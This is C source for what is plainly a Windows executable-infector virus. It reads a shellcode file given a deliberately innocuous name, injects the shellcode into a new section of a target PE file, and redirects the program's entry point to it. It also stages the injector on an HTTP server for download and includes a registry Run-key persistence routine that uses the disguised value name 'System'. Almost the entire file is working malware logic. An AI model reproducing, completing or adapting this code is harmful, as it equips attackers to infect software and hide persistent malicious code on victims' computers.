#include <stdio.h>
#include <math.h>
#include <string.h>
#include <stdbool.h>
#include <Windows.h>
#include "exe.h"
#include "shellcode_functions.h"
#include "file_system.h"

#pragma warning(disable : 4996)

#define ERROR -1
#define SUCCESS 0
#define START_VALUE -2

#define ALREADY_INFECTED 1


// Shellcode is the binary file with the position independent code.

// Infect from this directory:
// #define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"

// Infect from this directory:
// it will be the shellcode file name in the program infected computer, so it have to be not sus.
#define SHELLCODE_PATH "serviece.bin"


#define CURRENT_EXE_PATH "C:\\Users\\User\\source\\repos\\virus\\Debug\\injector.exe"
#define EXE_LOCATION_HTTP_SERVER "C:\\Users\\User\\source\\repos\\virus\\http_server\\wwwroot\\injector.exe"

// path to my own program that pops up message box.
#define MSGBOX_PATH "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect\\msgBox.exe"
#define NOTEPAD_PLUS_PLUS_PATH "C:\\Program Files (x86)\\Notepad++\\notepad++.exe"
#define SEARCH_FROM_THERE_DIRECTORY "..\\programs_to_infect"	

// Values for the registry
#define VALUE_NAME "System" // won't look suspicious

int add_to_registry(char* path_to_exe);
int infect(char* infected_path);

int main()
{
	int result = START_VALUE;
	int infected_files = 0;
	char infected_path[MAX_PATH];

	if (!get_suitable_file(SEARCH_FROM_THERE_DIRECTORY, 0, infected_path))
		return ERROR;
	printf("%s is suitable \nstart infecting\n", infected_path);
	result = infect(infected_path);
	//if (result == SUCCESS)
	//	add_to_registry(infected_path);
	return result;
}

int add_to_registry(char* path_to_exe)
{
	HKEY key;
	LSTATUS result = 0;
	result = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
	if (result != ERROR_SUCCESS)
	{
		perror("Error opening registry key");
		return ERROR;
	}
	else
	{
		result = RegSetValueExA(key, VALUE_NAME, 0, REG_SZ, path_to_exe, strlen(path_to_exe) + 1);
		if (result != ERROR_SUCCESS)
		{
			perror("Error change registry value");
			return ERROR;
		}
		printf("Added value to registry key successfully\n");
		RegCloseKey(key);
	}
	return SUCCESS;
}

int infect(char* infected_path)
{
	// Restarting the infected file to original.
	// CopyFileA(MSGBOX_CPY_PATH, MSGBOX_PATH, FALSE);

	// Copy new exe to server root directory keep the injector.
	CopyFileA(CURRENT_EXE_PATH, EXE_LOCATION_HTTP_SERVER, FALSE);

	int result = SUCCESS;
	EXE_file* infected = NULL;
	PVOID infection_address = 0;
	DWORD new_entery_point = 0;
	PVOID shellcode_buffer = NULL;
	int shellcode_size = 0;

	shellcode_buffer = read_entire_file(SHELLCODE_PATH, &shellcode_size, &result);
	if (result == ERROR)
		goto end;
	 
	infected = init_victim(infected_path, shellcode_size, &result);
	if (result == ERROR)
		goto end;

	
	result = set_exe_headers(infected);
	if (result != SUCCESS)
		goto end;

	create_new_section(infected, shellcode_size);

	infection_address = infected->mapped_handle + infected->origianal_file_size;

	// copy shellcode to the infected exe.
	memcpy((LPBYTE)infection_address, shellcode_buffer, shellcode_size);
	set_addrress_in_shellcode(infected, infection_address, shellcode_size);

	// The new entery address of the infected exe will point to the new created section with the shellcode.
	infected->headers->OptionalHeader.AddressOfEntryPoint = infected->infected_section->VirtualAddress;

end:
	if (infected != NULL)
	{
		
		delete_EXE_file(infected);
	}
	if (shellcode_buffer != NULL)
		free(shellcode_buffer);

	if (result == ERROR)
		result = GetLastError();
	// run the infected.
	//system(INFECTED_PATH);
	return result;
}
